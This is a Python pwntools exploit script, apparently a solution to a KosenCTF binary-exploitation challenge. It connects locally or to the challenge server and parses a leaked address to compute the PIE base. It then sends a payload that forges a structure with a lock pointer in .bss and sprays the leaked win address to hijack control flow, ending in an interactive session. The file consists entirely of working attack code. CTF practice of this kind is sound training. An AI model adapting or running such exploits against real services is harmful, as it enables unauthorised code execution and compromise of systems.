from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = 'pwn.kosenctf.com'
PORT = 9003

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [0xb2b])

r.recvuntil('<win> = ')
leak = int(r.recvuntil('\n')[:-1], 16)
pie = leak - 0xa5a
dbg('leak')
dbg('pie')

bss = pie + 0x202060 # +0x200

payload = ''
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(1, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, bss) # lock
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, 0)
payload += flat(0, bss+0x208)

payload = payload.ljust(0x200, '\x00')
payload += p64(bss)
payload += p64(leak)*0x20

r.sendline(payload)

r.interactive()
r.close()
